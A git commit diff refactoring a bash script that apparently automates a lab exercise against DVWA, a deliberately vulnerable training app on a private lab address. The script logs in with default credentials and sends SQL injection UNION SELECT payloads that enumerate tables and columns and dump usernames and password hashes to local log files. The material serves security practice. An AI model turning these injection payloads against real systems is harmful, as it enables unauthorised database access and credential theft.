dfce784de00931c91666602247686aa0a4eecf9f
Wiktoria Blomgren Strandberg <102546496+wikblo-0@users.noreply.github.com>
2026-05-12 13:44:14 +0200

    Refactor high_security_level.sh for improved readability

--- high_security_level.sh
+++ high_security_level.sh
@@ -1,61 +1,79 @@
 #!/bin/bash
 
+SECURITY="high" #security level
+USER="admin" #username
+PASS="password" #password
+
 rm cookies.txt #removes old file with cookies
 
 #saves login cookies and login page html to local files
 curl -s -c cookies.txt \
--b "security=high" \
-http://192.168.56.105/DVWA/login.php \
->login.html
+  -b "security=$SECURITY" \
+  http://192.168.56.105/DVWA/login.php \
+  >login.html
 
 TOKEN=$(grep -oP "name='user_token' value='\K[^']+" login.html) #saves user token variable found in login html
 PHPSESSID=$(awk '$6=="PHPSESSID"{print $7}' cookies.txt) #saves PHP session ID found in cookies
 
 #logs in using cookies and user token
 curl -s -b cookies.txt \
--b "security=high" \
--d "username=admin&password=password&user_token=$TOKEN&Login=Login" \
-http://192.168.56.105/DVWA/login.php
+  -b "security=$SECURITY" \
+  -d "username=$USER&password=$PASS&user_token=$TOKEN&Login=Login" \
+  http://192.168.56.105/DVWA/login.php
 
 
-#saves result of table name retrieval to local log file 
-curl -X POST \
--b "PHPSESSID=$PHPSESSID; security=high" \
--H "Content-Type: application/x-www-form-urlencoded" \
--d "id=%27%20UNION%20SELECT%20table_name%2C%20NULL%20%20FROM%20information_schema.tables%20%20WHERE%20table_schema%20%3D%20database%28%29%23&Submit=Submit" \
-http://192.168.56.105/DVWA/vulnerabilities/sqli/session-input.php
 
-curl -X GET \
--b "PHPSESSID=$PHPSESSID; security=high" \
-http://192.168.56.105/DVWA/vulnerabilities/sqli/ \
-| grep -oP 'First name: \K[^<]+' \
-> /home/kali/tables.log 2>&1
+#saves result of table name retrieval to local log file
+#Sends payload
+curl -S -X POST \
+  -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
+  -d "id=' UNION SELECT table_name, NULL  FROM information_schema.tables  WHERE table_schema = database()#&Submit=Submit" \
+  http://192.168.56.105/DVWA/vulnerabilities/sqli/session-input.php
+#Retrieves result
+{
+echo "Security level: $SECURITY"
+echo "Attempting to retrieve table names..."
+echo "---------------------------------------------------"
+RESPONSE=$(curl -s \
+  -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
+  http://192.168.56.105/DVWA/vulnerabilities/sqli/)
+echo "$RESPONSE" | grep -oP 'First name: \K[^<]+' #Removes header (First name:) from result
+}> /home/kali/sqli_high1.log
+
 
 
 #saves result of column name retrieval to local log file
-curl -X POST \
--b "PHPSESSID=$PHPSESSID; security=high" \
--H "Content-Type: application/x-www-form-urlencoded" \
--d "id=%27%20UNION%20SELECT%20column_name%2C%20NULL%20%20FROM%20information_schema.columns%20%20WHERE%20table_name%20%3D%20%27users%27%23&Submit=Submit" \
-http://192.168.56.105/DVWA/vulnerabilities/sqli/session-input.php
+#Sends payload
+curl -s -X POST \
+  -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
+  -d "id=' UNION SELECT column_name, NULL  FROM information_schema.columns  WHERE table_name = 'users'#&Submit=Submit" \
+  http://192.168.56.105/DVWA/vulnerabilities/sqli/session-input.php
+#Retrieves result
+{
+echo "Security level: $SECURITY"
+echo "Attempting to retrieve column names..."
+echo "---------------------------------------------------"
+RESPONSE=$(curl -s \
+  -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
+  http://192.168.56.105/DVWA/vulnerabilities/sqli/)
+echo "$RESPONSE" | grep -oP 'First name: \K[^<]+' #Removes header (First name:) from result
+}> /home/kali/sqli_high2.log
 
-curl -X GET \
--b "PHPSESSID=$PHPSESSID; security=high" \
-http://192.168.56.105/DVWA/vulnerabilities/sqli/ \
-| grep -oP 'First name: \K[^<]+' \
-> /home/kali/columns.log 2>&1
 
 
 #saves result of credential retrieval to local log file
-curl -X POST \
--b "PHPSESSID=$PHPSESSID; security=high" \
--H "Content-Type: application/x-www-form-urlencoded" \
--d "id=%27%20UNION%20SELECT%20user%2C%20password%20FROM%20users%23&Submit=Submit" \
-http://192.168.56.105/DVWA/vulnerabilities/sqli/session-input.php
-
-curl -X GET \
--b "PHPSESSID=$PHPSESSID; security=high" \
-http://192.168.56.105/DVWA/vulnerabilities/sqli/ \
-| grep -oP 'First name: \K[^<]+|Surname: \K[^<]+' \
-| paste - - \
-> /home/kali/credentials.log 2>&1
+#Sends payload
+curl -s -X POST \
+  -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
+  -d "id=' UNION SELECT user, password FROM users#&Submit=Submit" \
+  http://192.168.56.105/DVWA/vulnerabilities/sqli/session-input.php
+#Retrieves result
+{
+echo "Security level: $SECURITY"
+echo "Attempting to retrieve credentials..."
+echo "---------------------------------------------------"
+RESPONSE=$(curl -s \
+  -b "PHPSESSID=$PHPSESSID; security=$SECURITY" \
+  http://192.168.56.105/DVWA/vulnerabilities/sqli/)
+echo "$RESPONSE" | grep -oP 'First name: \K[^<]+|Surname: \K[^<]+' | paste - -  #Removes header (First name:) from result. Returns username and password on the same line
+}> /home/kali/sqli_high3.log
